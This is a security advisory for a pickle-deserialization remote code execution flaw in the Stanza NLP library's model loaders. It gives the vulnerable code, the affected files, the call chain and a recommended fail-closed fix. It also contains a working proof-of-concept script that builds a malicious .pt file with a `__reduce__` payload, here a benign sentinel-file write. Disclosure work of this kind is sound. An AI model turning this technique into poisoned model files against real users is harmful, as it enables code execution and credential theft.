# [H] Stanza: Remote Code Execution via Unsafe Pickle Deserialization in Model Loaders

## Summary
Severity: High
Advisory: GHSA-v5jw-96jm-7h2c
CVE: CVE-2026-54499
CWE: CWE-502, CWE-676
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-v5jw-96jm-7h2c
Type: github-advisory

## Affected
- PyPI: `stanza` — affected >=0 <1.12.2

## Details
### Summary

Stanza 1.12.0 attempts to safely load PyTorch checkpoint files using `torch.load(..., weights_only=True)`, but automatically falls back to the fully unsafe `torch.load(..., weights_only=False)` when the safe load raises `pickle.UnpicklingError`. Because the `UnpicklingError` condition is fully attacker-controllable, any `.pt` file that contains a single unsupported pickle global will trigger it.

An attacker who can place a malicious pretrain or model file on disk (via supply-chain compromise, a poisoned model repository, or a shared model cache) can achieve arbitrary code execution on any machine that loads a Stanza NLP pipeline. 

Code execution occurs inside the Stanza pretrain-loading API, not merely by calling `torch.load` directly.


### Details

The vulnerable code is in [pretrain.py#L59-L67](https://github.com/stanfordnlp/stanza/blob/main/stanza/models/common/pretrain.py#L59-L67) (Stanza 1.12.0):

```python
try:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
except UnpicklingError:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=False)
```

When `weights_only=True` is passed, PyTorch's deserializer raises `pickle.UnpicklingError` for any object whose class or callable is not on the safe-globals allowlist. This is the intended safety mechanism. However, Stanza catches that exception and immediately reloads the **same attacker-controlled file** with `weights_only=False`, which invokes Python's full pickle deserializer and executes any `__reduce__` method in the file without restriction.

The fallback is triggered reliably and intentionally: an attacker embeds one unsupported pickle global (e.g., `builtins.open`) anywhere in an otherwise structurally valid Stanza pretrain state dict. The safe load rejects it; the unsafe reload runs it.

**The same try/except pattern exists in at least five additional loaders in Stanza 1.12.0:**

| File | Lines |
|------|-------|
| `stanza/models/common/pretrain.py` | 64–66 |
| `stanza/models/coref/model.py` | 251–253, 329–331 |
| `stanza/models/classifiers/trainer.py` | 80–82 |
| `stanza/models/constituency/base_trainer.py` | 94–96 |

Additionally, `stanza/models/lemma_classifier/base_model.py:127` calls `torch.load(filename, lambda storage, loc: storage)` with no `weights_only` argument at all, which defaults to `False` on any PyTorch < 2.6.

The call chain from the public API to the vulnerable fallback is:

```
stanza.models.common.foundation_cache.load_pretrain(path)
  → FoundationCache.load_pretrain(path)
    → stanza.models.common.pretrain.Pretrain(filename)
      → Pretrain.emb  (property access triggers load)
        → Pretrain.load()
          → torch.load(..., weights_only=True)   # raises UnpicklingError
          → torch.load(..., weights_only=False)  # executes arbitrary pickle
```

---

### PoC

**Environment:** Python 3.11, `stanza==1.12.0`, `torch==2.12.0`

**Step 1: Install dependencies:**
```bash
pip install stanza==1.12.0 torch==2.12.0
```

**Step 2: Save the following as `exploit.py`:**

```python
import os
from pathlib import Path

import torch
import stanza
from stanza.models.common.foundation_cache import FoundationCache, load_pretrain
from stanza.models.common.vocab import VOCAB_PREFIX

SENTINEL = "/tmp/stanza_rce_proof"
MODEL    = "/tmp/stanza_malicious.pt"

class HarmlessPayload:
    """Demonstrates execution; writes a sentinel file."""
    def __init__(self, path):
        self.path = path
    def __reduce__(self):
        return (open, (self.path, "w"))

# Build a structurally valid Stanza pretrain state dict with the payload embedded.
words = VOCAB_PREFIX + ["hello"]
state = {
    "vocab": {
        "lang": "", "idx": 0, "cutoff": 0, "lower": False,
        "_id2unit": words,
        "_unit2id": {w: i for i, w in enumerate(words)},
    },
    "emb": torch.zeros((len(words), 2), dtype=torch.float32),
    "payload": HarmlessPayload(SENTINEL),   # ← the malicious object
}
torch.save(state, MODEL)

# Confirm safe-only load raises UnpicklingError and does NOT create sentinel.
try:
    torch.load(MODEL, lambda s, l: s, weights_only=True)
    print("UNEXPECTED: safe load succeeded (no fallback needed)")
except Exception as e:
    print(f"Control: safe load raised {type(e).__name__} : sentinel exists: {Path(SENTINEL).exists()}")

# Load through the real Stanza API. The fallback fires and the sentinel is created.
cache   = FoundationCache()
pretrain = load_pretrain(MODEL, foundation_cache=cache)

print(f"stanza={stanza.__version__}  torch={torch.__version__}")
print(f"emb_shape={tuple(pretrain.emb.shape)}")
print(f"sentinel_exists={Path(SENTINEL).exists()}")
print("VERDICT: ACTUAL_VULN_REAL_STANZA_PATH" if Path(SENTINEL).exists() else "VERDICT: UNPROVEN")
```

**Step 3 : Run:**
```bash
python exploit.py
```

**Expected output (confirmed):**
```
Control: safe load raised UnpicklingError : sentinel exists: False
stanza=1.12.0  torch=2.12.0
emb_shape=(5, 2)
sentinel_exists=True
VERDICT: ACTUAL_VULN_REAL_STANZA_PATH
```

The sentinel is created exclusively by the Stanza pretrain-loading API invoking the unsafe fallback : not by a direct `torch.load` call in the PoC.

---

### Impact

**Vulnerability class:** CWE-502 : Deserialization of Untrusted Data

**Who is impacted:** Any user, researcher, CI/CD pipeline, or production NLP service that loads a Stanza model pretrain file from a source that is not under the victim's exclusive cryptographic control. Concretely:

- Developers who run `stanza.Pipeline(lang)` after downloading models from HuggingFace or GitHub
- CI pipelines that automatically refresh Stanza models during builds
- Research environments that share pretrain files over shared network storage or model repositories

**Attack prerequisites:** The attacker must be able to place a malicious `.pt` pretrain file at a path that Stanza will load. Realistic delivery vectors include:
- Compromise of a HuggingFace model repository hosting Stanza pretrain weights
- Poisoning of a shared model cache directory (NFS, S3, artifact store)
- A malicious pretrain file distributed via a third-party fine-tuning hub or research repo

**What an attacker achieves:** Arbitrary code execution with the full privileges of the process running `stanza.Pipeline()`, typically a developer workstation, a Jupyter notebook server, or a GPU training node. This allows credential theft (HuggingFace tokens, cloud IAM keys from environment variables), persistent backdoors, data exfiltration, and lateral movement in multi-tenant training infrastructure.

**Recommended fix:**

Remove the unsafe fallback entirely. If `weights_only=True` raises `UnpicklingError`, fail closed:

```python
try:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
except UnpicklingError as e:
    raise RuntimeError(
        f"Refusing to load legacy pretrain file {self.filename!r} with unsafe "
        "deserialization. Regenerate the file using a trusted Stanza migration tool."
    ) from e
```

If legacy NumPy-containing pretrain files must be supported, use PyTorch's `add_safe_globals()` API to allowlist the specific NumPy dtypes required, rather than disabling all safety checks. Apply the same fix to all six affected loaders listed above.

## References
- https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c
- https://github.com/stanfordnlp/stanza
